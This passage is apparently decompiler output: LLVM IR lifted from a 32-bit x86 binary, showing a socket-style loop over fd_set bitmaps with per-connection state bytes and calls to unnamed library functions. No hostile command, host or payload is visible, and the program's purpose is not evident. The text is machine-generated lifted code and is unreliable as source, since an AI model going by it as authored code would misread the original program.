  %v1_8048cc8 = add i32 %v0_8048cc8, -1440
  %v2_8048cc8 = inttoptr i32 %v1_8048cc8 to i32*
  %v3_8048cc8 = load i32, i32* %v2_8048cc8, align 4
  store i32 %v3_8048cc8, i32* %eax.global-to-local, align 4
  %v0_8048cce = load i32, i32* @esp, align 4
  %v1_8048cce = add i32 %v0_8048cce, 72
  %v2_8048cce = inttoptr i32 %v1_8048cce to i32*
  %v3_8048cce = load i32, i32* %v2_8048cce, align 4
  %v5_8048cce = sub i32 %v3_8048cce, %v3_8048cc8
  %v11_8048cce = xor i32 %v3_8048cce, %v3_8048cc8
  %v12_8048cce = xor i32 %v5_8048cce, %v3_8048cce
  %v13_8048cce = and i32 %v12_8048cce, %v11_8048cce
  %v14_8048cce = icmp slt i32 %v13_8048cce, 0
  %v15_8048cce = icmp eq i32 %v5_8048cce, 0
  store i1 %v15_8048cce, i1* %zf.global-to-local, align 1
  %v16_8048cce = icmp slt i32 %v5_8048cce, 0
  %v2_8048cd2 = icmp eq i1 %v16_8048cce, %v14_8048cce
  br i1 %v2_8048cd2, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048cdd:                             ; preds = %dec_label_pc_8048582
  %v1_8048cdd = add i32 %v0_8048597, 72
  %v2_8048cdd = inttoptr i32 %v1_8048cdd to i32*
  %v3_8048cdd = load i32, i32* %v2_8048cdd, align 4
  store i32 %v3_8048cdd, i32* %eax.global-to-local, align 4
  %v1_8048ce1 = icmp eq i32 %v3_8048cdd, 0
  store i1 %v1_8048ce1, i1* %zf.global-to-local, align 1
  br i1 %v1_8048ce1, label %dec_label_pc_80484e5, label %dec_label_pc_8048ce9

dec_label_pc_8048ce9:                             ; preds = %dec_label_pc_8048cdd
  %v1_8048ce9 = add i32 %v0_8048597, 20888
  %v2_8048ce9 = inttoptr i32 %v1_8048ce9 to i32*
  store i32 0, i32* %v2_8048ce9, align 4
  %v0_8048cf4 = load i32, i32* @esp, align 4
  %v1_8048cf4 = add i32 %v0_8048cf4, 20884
  %v2_8048cf4 = inttoptr i32 %v1_8048cf4 to i32*
  store i32 1, i32* %v2_8048cf4, align 4
  %v0_8048cff = load i32, i32* @esp, align 4
  %v9_8048cff = icmp eq i32 %v0_8048cff, 12
  store i1 %v9_8048cff, i1* %zf.global-to-local, align 1
  %v1_8048d02 = add i32 %v0_8048cff, 20884
  store i32 %v1_8048d02, i32* %eax.global-to-local, align 4
  %v2_8048d09 = add i32 %v0_8048cff, -16
  %v3_8048d09 = inttoptr i32 %v2_8048d09 to i32*
  store i32 %v1_8048d02, i32* %v3_8048d09, align 4
  %v1_8048d0a = add i32 %v0_8048cff, -20
  %v2_8048d0a = inttoptr i32 %v1_8048d0a to i32*
  store i32 0, i32* %v2_8048d0a, align 4
  %v1_8048d0c = add i32 %v0_8048cff, 20612
  store i32 %v1_8048d0c, i32* %edx.global-to-local, align 4
  %v2_8048d13 = add i32 %v0_8048cff, -24
  %v3_8048d13 = inttoptr i32 %v2_8048d13 to i32*
  store i32 %v1_8048d0c, i32* %v3_8048d13, align 4
  %v1_8048d14 = add i32 %v0_8048cff, 20740
  store i32 %v1_8048d14, i32* %ecx.global-to-local, align 4
  %v2_8048d1b = add i32 %v0_8048cff, -28
  %v3_8048d1b = inttoptr i32 %v2_8048d1b to i32*
  store i32 %v1_8048d14, i32* %v3_8048d1b, align 4
  %v1_8048d1c = add i32 %v0_8048cff, 72
  %v2_8048d1c = inttoptr i32 %v1_8048d1c to i32*
  %v3_8048d1c = load i32, i32* %v2_8048d1c, align 4
  store i32 %v3_8048d1c, i32* %eax.global-to-local, align 4
  %v2_8048d20 = add i32 %v0_8048cff, -32
  %v3_8048d20 = inttoptr i32 %v2_8048d20 to i32*
  store i32 %v3_8048d1c, i32* %v3_8048d20, align 4
  %v0_8048d21 = call i32 @function_80523f8()
  store i32 %v0_8048d21, i32* %eax.global-to-local, align 4
  %v0_8048d26 = load i32, i32* @esp, align 4
  %v9_8048d26 = icmp eq i32 %v0_8048d26, -20
  store i1 %v9_8048d26, i1* %zf.global-to-local, align 1
  store i32 %v0_8048d21, i32* @ebx, align 4
  %v1_8048d2b = add i32 %v0_8048d26, 16
  %v2_8048d2b = inttoptr i32 %v1_8048d2b to i32*
  store i32 0, i32* %v2_8048d2b, align 4
  %v2_8048d2d = call i32 @function_80524b2(i32* %v1_80484ea)
  store i32 %v2_8048d2d, i32* %eax.global-to-local, align 4
  %v1_8048d32 = load i32, i32* @esp, align 4
  %v2_8048d32 = add i32 %v1_8048d32, 132
  %v3_8048d32 = inttoptr i32 %v2_8048d32 to i32*
  store i32 %v2_8048d2d, i32* %v3_8048d32, align 4
  %v0_8048d39 = load i32, i32* @esp, align 4
  %v1_8048d39 = add i32 %v0_8048d39, 16
  %v0_8048d3c = load i32, i32* @ebx, align 4
  %v1_8048d3c = icmp eq i32 %v0_8048d3c, 0
  store i1 %v1_8048d3c, i1* %zf.global-to-local, align 1
  %tmp143 = icmp slt i32 %v0_8048d3c, 1
  br i1 %tmp143, label %dec_label_pc_80484e5, label %dec_label_pc_8048d44

dec_label_pc_8048d44:                             ; preds = %dec_label_pc_8048ce9
  %v1_8048d44 = add i32 %v0_8048d39, 48
  %v2_8048d44 = inttoptr i32 %v1_8048d44 to i32*
  %v3_8048d44 = load i32, i32* %v2_8048d44, align 4
  store i32 %v3_8048d44, i32* %eax.global-to-local, align 4
  %v1_8048d48 = add i32 %v0_8048d39, 60
  %v2_8048d48 = inttoptr i32 %v1_8048d48 to i32*
  store i32 0, i32* %v2_8048d48, align 4
  %v0_8048d50 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048d50, i32* %edx.global-to-local, align 4
  %v1_8048d52 = load i32, i32* @esp, align 4
  %v2_8048d52 = add i32 %v1_8048d52, 92
  %v3_8048d52 = inttoptr i32 %v2_8048d52 to i32*
  store i32 %v0_8048d50, i32* %v3_8048d52, align 4
  %v0_8048db9.pre = load i32, i32* @esp, align 4
  %v0_8048dbd.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048d58:                             ; preds = %dec_label_pc_8048dd2, %dec_label_pc_8048e2e
  %v1_8048e7a = phi i32 [ %v0_8048ddc, %dec_label_pc_8048dd2 ], [ %v0_8048d60.pre, %dec_label_pc_8048e2e ]
  %v0_8048d58 = phi i32 [ %v3_8048dc7, %dec_label_pc_8048dd2 ], [ %v0_8048d58.pre, %dec_label_pc_8048e2e ]
  %v2_8048d5a = udiv i32 %v0_8048d58, 32
  store i32 %v2_8048d5a, i32* %ecx.global-to-local, align 4
  %v1_8048d5d = urem i32 %v0_8048d58, 32
  store i32 %v1_8048d5d, i32* %eax.global-to-local, align 4
  %v2_8048d60 = mul nuw nsw i32 %v2_8048d5a, 4
  %v3_8048d60 = add i32 %v1_8048e7a, 20740
  %v4_8048d60 = add i32 %v3_8048d60, %v2_8048d60
  %v5_8048d60 = inttoptr i32 %v4_8048d60 to i32*
  %v6_8048d60 = load i32, i32* %v5_8048d60, align 4
  %v9_8048d60 = shl i32 1, %v1_8048d5d
  %v10_8048d60 = and i32 %v6_8048d60, %v9_8048d60
  %v11_8048d60 = icmp ne i32 %v10_8048d60, 0
  %v1_8048d68 = zext i1 %v11_8048d60 to i32
  store i32 %v1_8048d68, i32* %eax.global-to-local, align 4
  %v4_8048d6b = icmp eq i1 %v11_8048d60, false
  store i1 %v4_8048d6b, i1* %zf.global-to-local, align 1
  br i1 %v4_8048d6b, label %dec_label_pc_8048d91, label %dec_label_pc_8048d6f

dec_label_pc_8048d6f:                             ; preds = %dec_label_pc_8048d58
  %v1_8048d6f = add i32 %v1_8048e7a, 92
  %v2_8048d6f = inttoptr i32 %v1_8048d6f to i32*
  %v3_8048d6f = load i32, i32* %v2_8048d6f, align 4
  store i32 %v3_8048d6f, i32* %edx.global-to-local, align 4
  %v1_8048d73 = add i32 %v3_8048d6f, -1448
  %v2_8048d73 = inttoptr i32 %v1_8048d73 to i8*
  %v3_8048d73 = load i8, i8* %v2_8048d73, align 1
  %v4_8048d73 = zext i8 %v3_8048d73 to i32
  store i32 %v4_8048d73, i32* @eax, align 4
  %v10_8048d79 = icmp eq i8 %v3_8048d73, 6
  store i1 %v10_8048d79, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d79, label %dec_label_pc_8048e7a, label %dec_label_pc_8048d81

dec_label_pc_8048d81:                             ; preds = %dec_label_pc_8048d6f
  %v10_8048d81 = icmp eq i8 %v3_8048d73, 7
  store i1 %v10_8048d81, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d81, label %dec_label_pc_80494af, label %dec_label_pc_8048d89

dec_label_pc_8048d89:                             ; preds = %dec_label_pc_8048d81
  %v10_8048d89 = icmp eq i8 %v3_8048d73, 10
  store i1 %v10_8048d89, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d89, label %dec_label_pc_80497b3, label %dec_label_pc_8048d91

dec_label_pc_8048d91:                             ; preds = %dec_label_pc_80495e0, %dec_label_pc_8049b0f, %dec_label_pc_8049c31, %dec_label_pc_8049ae5, %dec_label_pc_8048d89, %dec_label_pc_8048d58, %dec_label_pc_8048db9, %dec_label_pc_8049e5a, %dec_label_pc_8049c42, %dec_label_pc_8049af8, %dec_label_pc_8049abf, %dec_label_pc_8049a49, %dec_label_pc_80497f9, %dec_label_pc_804949f, %dec_label_pc_8048e4a, %dec_label_pc_80496c3
  %v0_8048d91 = load i32, i32* @esp, align 4
  %v1_8048d91 = add i32 %v0_8048d91, 44
  %v2_8048d91 = inttoptr i32 %v1_8048d91 to i32*
  %v3_8048d91 = load i32, i32* %v2_8048d91, align 4
  store i32 %v3_8048d91, i32* %edx.global-to-local, align 4
  %v1_8048d95 = add i32 %v0_8048d91, 92
  %v2_8048d95 = inttoptr i32 %v1_8048d95 to i32*
  %v3_8048d95 = load i32, i32* %v2_8048d95, align 4
  %v1_8048d99 = add i32 %v3_8048d95, 3140
  store i32 %v1_8048d99, i32* %eax.global-to-local, align 4
  %v1_8048d9e = add i32 %v3_8048d91, 1
  store i32 %v1_8048d9e, i32* %edx.global-to-local, align 4
  store i32 %v1_8048d9e, i32* %v2_8048d91, align 4
  %v0_8048da3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048da3 = load i32, i32* @esp, align 4
  %v2_8048da3 = add i32 %v1_8048da3, 92
  %v3_8048da3 = inttoptr i32 %v2_8048da3 to i32*
  store i32 %v0_8048da3, i32* %v3_8048da3, align 4
  %v0_8048da7 = load i32, i32* @esp, align 4
  %v1_8048da7 = add i32 %v0_8048da7, 112
  %v2_8048da7 = inttoptr i32 %v1_8048da7 to i32*
  %v3_8048da7 = load i32, i32* %v2_8048da7, align 4
  store i32 %v3_8048da7, i32* %eax.global-to-local, align 4
  %v1_8048dab = add i32 %v0_8048da7, 44
  %v2_8048dab = inttoptr i32 %v1_8048dab to i32*
  %v3_8048dab = load i32, i32* %v2_8048dab, align 4
  %v15_8048dab = icmp eq i32 %v3_8048dab, %v3_8048da7
  store i1 %v15_8048dab, i1* %zf.global-to-local, align 1
  br i1 %v15_8048dab, label %dec_label_pc_80484e5, label %dec_label_pc_8048db5

dec_label_pc_8048db5:                             ; preds = %dec_label_pc_8048d91
  %v1_8048db5 = add i32 %v0_8048da7, 92
  %v2_8048db5 = inttoptr i32 %v1_8048db5 to i32*
  %v3_8048db5 = load i32, i32* %v2_8048db5, align 4
  store i32 %v3_8048db5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048db9:                             ; preds = %dec_label_pc_8048d44, %dec_label_pc_8048db5
  %v0_8048dbd = phi i32 [ %v0_8048dbd.pre, %dec_label_pc_8048d44 ], [ %v3_8048db5, %dec_label_pc_8048db5 ]
  %v1_8048dc3 = phi i32 [ %v0_8048db9.pre, %dec_label_pc_8048d44 ], [ %v0_8048da7, %dec_label_pc_8048db5 ]
  %v1_8048db9 = add i32 %v1_8048dc3, 92
  %v2_8048db9 = inttoptr i32 %v1_8048db9 to i32*
  %v3_8048db9 = load i32, i32* %v2_8048db9, align 4
  store i32 %v3_8048db9, i32* %eax.global-to-local, align 4
  %v1_8048dbd = add i32 %v0_8048dbd, -1452
  store i32 %v1_8048dbd, i32* %edx.global-to-local, align 4
  %v2_8048dc3 = add i32 %v1_8048dc3, 76
  %v3_8048dc3 = inttoptr i32 %v2_8048dc3 to i32*
  store i32 %v1_8048dbd, i32* %v3_8048dc3, align 4
  %v0_8048dc7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048dc7 = add i32 %v0_8048dc7, -1452
  %v2_8048dc7 = inttoptr i32 %v1_8048dc7 to i32*
  %v3_8048dc7 = load i32, i32* %v2_8048dc7, align 4
  store i32 %v3_8048dc7, i32* %ecx.global-to-local, align 4
  %v10_8048dcd = icmp eq i32 %v3_8048dc7, -1
  store i1 %v10_8048dcd, i1* %zf.global-to-local, align 1
  br i1 %v10_8048dcd, label %dec_label_pc_8048d91, label %dec_label_pc_8048dd2

dec_label_pc_8048dd2:                             ; preds = %dec_label_pc_8048db9
  %v2_8048dd6 = udiv i32 %v3_8048dc7, 32
  store i32 %v2_8048dd6, i32* %edx.global-to-local, align 4
  %v1_8048dd9 = urem i32 %v3_8048dc7, 32
  store i32 %v1_8048dd9, i32* %eax.global-to-local, align 4
  %v0_8048ddc = load i32, i32* @esp, align 4
  %v2_8048ddc = mul nuw nsw i32 %v2_8048dd6, 4
  %v3_8048ddc = add nuw nsw i32 %v2_8048ddc, 20612
  %v4_8048ddc = add i32 %v3_8048ddc, %v0_8048ddc
  %v5_8048ddc = inttoptr i32 %v4_8048ddc to i32*
  %v6_8048ddc = load i32, i32* %v5_8048ddc, align 4
  %v9_8048ddc = shl i32 1, %v1_8048dd9
  %v10_8048ddc = and i32 %v6_8048ddc, %v9_8048ddc
  %v11_8048ddc = icmp ne i32 %v10_8048ddc, 0
  %v1_8048de4 = zext i1 %v11_8048ddc to i32
  store i32 %v1_8048de4, i32* %eax.global-to-local, align 4
  %v4_8048de7 = icmp eq i1 %v11_8048ddc, false
  store i1 %v4_8048de7, i1* %zf.global-to-local, align 1
  br i1 %v4_8048de7, label %dec_label_pc_8048d58, label %dec_label_pc_8048def

dec_label_pc_8048def:                             ; preds = %dec_label_pc_8048dd2
  %v1_8048def = add i32 %v0_8048ddc, 20896
  %v2_8048def = inttoptr i32 %v1_8048def to i32*
  store i32 0, i32* %v2_8048def, align 4
  %v0_8048dfa = load i32, i32* @esp, align 4
  %v1_8048dfa = add i32 %v0_8048dfa, 20892
  %v2_8048dfa = inttoptr i32 %v1_8048dfa to i32*
  store i32 4, i32* %v2_8048dfa, align 4
  %v0_8048e05 = load i32, i32* @esp, align 4
  %v9_8048e05 = icmp eq i32 %v0_8048e05, 12
  store i1 %v9_8048e05, i1* %zf.global-to-local, align 1
  %v1_8048e08 = add i32 %v0_8048e05, 20892
  store i32 %v1_8048e08, i32* %edx.global-to-local, align 4
  %v2_8048e0f = add i32 %v0_8048e05, -16
  %v3_8048e0f = inttoptr i32 %v2_8048e0f to i32*
  store i32 %v1_8048e08, i32* %v3_8048e0f, align 4
  %v1_8048e10 = add i32 %v0_8048e05, 20896
  store i32 %v1_8048e10, i32* %eax.global-to-local, align 4
  %v2_8048e17 = add i32 %v0_8048e05, -20
  %v3_8048e17 = inttoptr i32 %v2_8048e17 to i32*
  store i32 %v1_8048e10, i32* %v3_8048e17, align 4
  %v1_8048e18 = add i32 %v0_8048e05, -24
  %v2_8048e18 = inttoptr i32 %v1_8048e18 to i32*
  store i32 4, i32* %v2_8048e18, align 4
  %v1_8048e1a = add i32 %v0_8048e05, -28
  %v2_8048e1a = inttoptr i32 %v1_8048e1a to i32*
  store i32 1, i32* %v2_8048e1a, align 4
  %v0_8048e1c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8048e1c = add i32 %v0_8048e05, -32
  %v3_8048e1c = inttoptr i32 %v2_8048e1c to i32*
  store i32 %v0_8048e1c, i32* %v3_8048e1c, align 4
  %v0_8048e1d = call i32 @function_8052860()
  store i32 %v0_8048e1d, i32* %eax.global-to-local, align 4
  %v0_8048e22 = load i32, i32* @esp, align 4
  %v1_8048e22 = add i32 %v0_8048e22, 32
  %v2_8048e25 = add i32 %v0_8048e22, 20928
  %v3_8048e25 = inttoptr i32 %v2_8048e25 to i32*
  %v4_8048e25 = load i32, i32* %v3_8048e25, align 4
  %v5_8048e25 = or i32 %v4_8048e25, %v0_8048e1d
  %v6_8048e25 = icmp eq i32 %v5_8048e25, 0
  store i1 %v6_8048e25, i1* %zf.global-to-local, align 1
  store i32 %v5_8048e25, i32* %eax.global-to-local, align 4
  %v1_8048e2c = icmp eq i1 %v6_8048e25, false
  br i1 %v1_8048e2c, label %dec_label_pc_8048e4a, label %dec_label_pc_8048e2e

dec_label_pc_8048e2e:                             ; preds = %dec_label_pc_8048def
  %v1_8048e2e = add i32 %v0_8048e22, 124
  %v2_8048e2e = inttoptr i32 %v1_8048e2e to i32*
  %v3_8048e2e = load i32, i32* %v2_8048e2e, align 4
  store i32 %v3_8048e2e, i32* %edx.global-to-local, align 4
  %v1_8048e32 = add i32 %v3_8048e2e, -1452
  %v2_8048e32 = inttoptr i32 %v1_8048e32 to i32*
  %v3_8048e32 = load i32, i32* %v2_8048e32, align 4
  store i32 %v3_8048e32, i32* %ecx.global-to-local, align 4
  %v1_8048e38 = add i32 %v3_8048e2e, -1448
  %v2_8048e38 = inttoptr i32 %v1_8048e38 to i8*
  store i8 4, i8* %v2_8048e38, align 1
  %v0_8048d58.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8048d60.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048d58

dec_label_pc_8048e44:                             ; preds = %dec_label_pc_80494dc
  %v0_8048e44 = load i32, i32* @edi, align 4
  %v1_8048e44 = inttoptr i32 %v0_8048e44 to i32*
  store i32 104, i32* %v1_8048e44, align 4
  %v0_8048e4a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048e4a

dec_label_pc_8048e4a:                             ; preds = %dec_label_pc_8049b0f, %dec_label_pc_8048e7a, %dec_label_pc_8048def, %dec_label_pc_8048e44
  %v0_8048e4a = phi i32 [ %v1_804950d, %dec_label_pc_8049b0f ], [ %v1_8048eb7, %dec_label_pc_8048e7a ], [ %v1_8048e22, %dec_label_pc_8048def ], [ %v0_8048e4a.pre, %dec_label_pc_8048e44 ]
  %v9_8048e4a = icmp eq i32 %v0_8048e4a, 12
  store i1 %v9_8048e4a, i1* %zf.global-to-local, align 1
  %v1_8048e4d = add i32 %v0_8048e4a, 92
  %v2_8048e4d = inttoptr i32 %v1_8048e4d to i32*
  %v3_8048e4d = load i32, i32* %v2_8048e4d, align 4
  store i32 %v3_8048e4d, i32* %ecx.global-to-local, align 4
  %v1_8048e51 = add i32 %v3_8048e4d, -1452
  %v2_8048e51 = inttoptr i32 %v1_8048e51 to i32*
  %v3_8048e51 = load i32, i32* %v2_8048e51, align 4
  store i32 %v3_8048e51, i32* @ebx, align 4
  %v2_8048e57 = add i32 %v0_8048e4a, -16
  %v3_8048e57 = inttoptr i32 %v2_8048e57 to i32*
  store i32 %v3_8048e51, i32* %v3_8048e57, align 4
  %v1_8048e58 = call i32 @function_80521f1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048e58, i32* %eax.global-to-local, align 4
  %v0_8048e5d = load i32, i32* @esp, align 4
  %v1_8048e5d = add i32 %v0_8048e5d, 108
  %v2_8048e5d = inttoptr i32 %v1_8048e5d to i32*
  %v3_8048e5d = load i32, i32* %v2_8048e5d, align 4
  store i32 %v3_8048e5d, i32* %eax.global-to-local, align 4
  %v6_8048e61 = icmp eq i32 %v0_8048e5d, -16
  store i1 %v6_8048e61, i1* %zf.global-to-local, align 1
  %v1_8048e64 = add i32 %v3_8048e5d, -1452
  %v2_8048e64 = inttoptr i32 %v1_8048e64 to i32*
  store i32 -1, i32* %v2_8048e64, align 4
  %v0_8048e6e = load i32, i32* %eax.global-to-local, align 4
  %v1_8048e6e = add i32 %v0_8048e6e, -1448
  %v2_8048e6e = inttoptr i32 %v1_8048e6e to i8*
  store i8 0, i8* %v2_8048e6e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8048e7a:                             ; preds = %dec_label_pc_8048d6f
  %v2_8048e7a = add i32 %v1_8048e7a, -4
  %v3_8048e7a = inttoptr i32 %v2_8048e7a to i32*
  store i32 %v4_8048d73, i32* %v3_8048e7a, align 4
  %v0_8048e7b = load i32, i32* @eax, align 4
  %v2_8048e7b = add i32 %v1_8048e7a, -8
  %v3_8048e7b = inttoptr i32 %v2_8048e7b to i32*
  store i32 %v0_8048e7b, i32* %v3_8048e7b, align 4
  %v1_8048e7c = add i32 %v1_8048e7a, -12
  %v2_8048e7c = inttoptr i32 %v1_8048e7c to i32*
  store i32 10240, i32* %v2_8048e7c, align 4
  %v1_8048e81 = add i32 %v1_8048e7a, 131
  store i32 %v1_8048e81, i32* %ecx.global-to-local, align 4
  %v2_8048e88 = add i32 %v1_8048e7a, -16
  %v3_8048e88 = inttoptr i32 %v2_8048e88 to i32*
  store i32 %v1_8048e81, i32* %v3_8048e88, align 4
  %v2_8048e89 = call i32 @function_8051ce0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  %v0_8048e8e = load i32, i32* @esp, align 4
  %v1_8048e8e = add i32 %v0_8048e8e, -4
  %v2_8048e8e = inttoptr i32 %v1_8048e8e to i32*
  store i32 16386, i32* %v2_8048e8e, align 4
  %v1_8048e93 = add i32 %v0_8048e8e, -8
  %v2_8048e93 = inttoptr i32 %v1_8048e93 to i32*
  store i32 10240, i32* %v2_8048e93, align 4
  %v1_8048e98 = add i32 %v0_8048e8e, 147
  store i32 %v1_8048e98, i32* %eax.global-to-local, align 4
  %v2_8048e9f = add i32 %v0_8048e8e, -12
  %v3_8048e9f = inttoptr i32 %v2_8048e9f to i32*
  store i32 %v1_8048e98, i32* %v3_8048e9f, align 4
  %v1_8048ea0 = add i32 %v0_8048e8e, 108
  %v2_8048ea0 = inttoptr i32 %v1_8048ea0 to i32*
  %v3_8048ea0 = load i32, i32* %v2_8048ea0, align 4
  store i32 %v3_8048ea0, i32* %edx.global-to-local, align 4
  %v1_8048ea4 = add i32 %v3_8048ea0, -1452
  %v2_8048ea4 = inttoptr i32 %v1_8048ea4 to i32*
  %v3_8048ea4 = load i32, i32* %v2_8048ea4, align 4
  store i32 %v3_8048ea4, i32* %eax.global-to-local, align 4
  %v2_8048eaa = add i32 %v0_8048e8e, -16
  %v3_8048eaa = inttoptr i32 %v2_8048eaa to i32*
  store i32 %v3_8048ea4, i32* %v3_8048eaa, align 4
  %v0_8048eab = call i32 @function_80528be()
  store i32 %v0_8048eab, i32* %eax.global-to-local, align 4
  %v1_8048eb0 = load i32, i32* @esp, align 4
  %v2_8048eb0 = add i32 %v1_8048eb0, 136
  %v3_8048eb0 = inttoptr i32 %v2_8048eb0 to i32*
  store i32 %v0_8048eab, i32* %v3_8048eb0, align 4
  %v0_8048eb7 = load i32, i32* @esp, align 4
  %v1_8048eb7 = add i32 %v0_8048eb7, 32
  %v1_8048eba = icmp eq i32 %v0_8048eab, 0
  store i1 %v1_8048eba, i1* %zf.global-to-local, align 1
  %tmp144 = icmp slt i32 %v0_8048eab, 1
  br i1 %tmp144, label %dec_label_pc_8048e4a, label %dec_label_pc_8048ebe

dec_label_pc_8048ebe:                             ; preds = %dec_label_pc_8048e7a
  %v1_8048ebe = add i32 %v0_8048eb7, 28
  %v2_8048ebe = inttoptr i32 %v1_8048ebe to i32*
  store i32 4, i32* %v2_8048ebe, align 4
  %v1_8048ec0 = add i32 %v0_8048eb7, 24
  %v2_8048ec0 = inttoptr i32 %v1_8048ec0 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b24.13 to i32), i32* %v2_8048ec0, align 4
  %v1_8048ec5 = add i32 %v0_8048eb7, 136
  %v2_8048ec5 = inttoptr i32 %v1_8048ec5 to i32*
  %v3_8048ec5 = load i32, i32* %v2_8048ec5, align 4
  store i32 %v3_8048ec5, i32* %eax.global-to-local, align 4
  %v2_8048ec9 = add i32 %v0_8048eb7, 20
  %v3_8048ec9 = inttoptr i32 %v2_8048ec9 to i32*
  store i32 %v3_8048ec5, i32* %v3_8048ec9, align 4
  %v1_8048eca = add i32 %v0_8048eb7, 163
  store i32 %v1_8048eca, i32* %edx.global-to-local, align 4
  %v2_8048ed1 = add i32 %v0_8048eb7, 16
  %v3_8048ed1 = inttoptr i32 %v2_8048ed1 to i32*
  store i32 %v1_8048eca, i32* %v3_8048ed1, align 4
  %v0_8048ed2 = call i32 @function_8051d00()
  %v0_8048ed7 = load i32, i32* @esp, align 4
  %v1_8048eda = add i32 %v0_8048ed2, 1
  %v8_8048eda = icmp eq i32 %v1_8048eda, 0
  store i1 %v8_8048eda, i1* %zf.global-to-local, align 1
  store i32 %v1_8048eda, i32* %eax.global-to-local, align 4
  %v1_8049ae5 = add i32 %v0_8048ed7, 120
  %v2_8049ae5 = inttoptr i32 %v1_8049ae5 to i32*
  br i1 %v8_8048eda, label %dec_label_pc_8049ae5, label %dec_label_pc_8048ee1

dec_label_pc_8048ee1:                             ; preds = %dec_label_pc_8048ebe, %dec_label_pc_8049ae5
  %v1_8048ee1 = add i32 %v0_8048ed7, 12
  %v2_8048ee1 = inttoptr i32 %v1_8048ee1 to i32*
  store i32 4, i32* %v2_8048ee1, align 4
  %v1_8048ee3 = add i32 %v0_8048ed7, 8
  %v2_8048ee3 = inttoptr i32 %v1_8048ee3 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b24.13 to i32), i32* %v2_8048ee3, align 4
  %v3_8048ee8 = load i32, i32* %v2_8049ae5, align 4
  %v2_8048eec = add i32 %v0_8048ed7, 4
  %v3_8048eec = inttoptr i32 %v2_8048eec to i32*
  store i32 %v3_8048ee8, i32* %v3_8048eec, align 4
  %v1_8048eed = add i32 %v0_8048ed7, 147
  store i32 %v1_8048eed, i32* %ecx.global-to-local, align 4
  %v3_8048ef4 = inttoptr i32 %v0_8048ed7 to i32*
  store i32 %v1_8048eed, i32* %v3_8048ef4, align 4
  %v0_8048ef5 = call i32 @function_8051d00()
  store i32 %v0_8048ef5, i32* %eax.global-to-local, align 4
  %v0_8048efa = load i32, i32* @esp, align 4
  %v2_8048efa = add i32 %v0_8048ef5, 147
  %v3_8048efa = add i32 %v2_8048efa, %v0_8048efa
  %v4_8048efa = inttoptr i32 %v3_8048efa to i8*
  store i8 0, i8* %v4_8048efa, align 1
  %v0_8048f02 = load i32, i32* @esp, align 4
  %v1_8048f02 = inttoptr i32 %v0_8048f02 to i32*
  %v3_8048f02 = add i32 %v0_8048f02, 4
  %v1_8048f03 = inttoptr i32 %v3_8048f02 to i32*
  %v2_8048f03 = load i32, i32* %v1_8048f03, align 4
  store i32 %v2_8048f03, i32* @edi, align 4
  store i32 0, i32* %v1_8048f03, align 4
  store i32 46, i32* %v1_8048f02, align 4
  %v3_8048f08 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f08, i32* %eax.global-to-local, align 4
  %v0_8048f0d = load i32, i32* @esp, align 4
  %v9_8048f0d = icmp eq i32 %v0_8048f0d, -12
  store i1 %v9_8048f0d, i1* %zf.global-to-local, align 1
  %v2_8048f10 = add i32 %v0_8048f0d, 8
  %v3_8048f10 = inttoptr i32 %v2_8048f10 to i32*
  store i32 %v3_8048f08, i32* %v3_8048f10, align 4
  %v1_8048f11 = add i32 %v0_8048f0d, 120
  %v2_8048f11 = inttoptr i32 %v1_8048f11 to i32*
  %v3_8048f11 = load i32, i32* %v2_8048f11, align 4
  %v2_8048f15 = add i32 %v0_8048f0d, 4
  %v3_8048f15 = inttoptr i32 %v2_8048f15 to i32*
  store i32 %v3_8048f11, i32* %v3_8048f15, align 4
  %v1_8048f16 = add i32 %v0_8048f0d, 147
  store i32 %v1_8048f16, i32* %eax.global-to-local, align 4
  %v3_8048f1d = inttoptr i32 %v0_8048f0d to i32*
  store i32 %v1_8048f16, i32* %v3_8048f1d, align 4
  %v4_8048f1e = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f23 = load i32, i32* @esp, align 4
  %v1_8048f23 = add i32 %v0_8048f23, 16
  %v1_8048f26 = add i32 %v4_8048f1e, 1
  %v8_8048f26 = icmp eq i32 %v1_8048f26, 0
  store i1 %v8_8048f26, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f26, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f26, label %dec_label_pc_8048f33, label %dec_label_pc_8048f29

dec_label_pc_8048f29:                             ; preds = %dec_label_pc_8048ee1
  %v1_8048f29 = add i32 %v0_8048f23, 108
  %v2_8048f29 = inttoptr i32 %v1_8048f29 to i32*
  %v3_8048f29 = load i32, i32* %v2_8048f29, align 4
  store i32 %v3_8048f29, i32* %edx.global-to-local, align 4
  %v1_8048f2d = inttoptr i32 %v3_8048f29 to i32*
  store i32 2, i32* %v1_8048f2d, align 4
  %v1_8048f33.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f33

dec_label_pc_8048f33:                             ; preds = %dec_label_pc_8048ee1, %dec_label_pc_8048f29
  %v1_8048f33 = phi i32 [ %v1_8048f23, %dec_label_pc_8048ee1 ], [ %v1_8048f33.pre, %dec_label_pc_8048f29 ]
  %v0_8048f33 = load i32, i32* @ecx, align 4
  %v2_8048f33 = add i32 %v1_8048f33, -4
  %v3_8048f33 = inttoptr i32 %v2_8048f33 to i32*
  store i32 %v0_8048f33, i32* %v3_8048f33, align 4
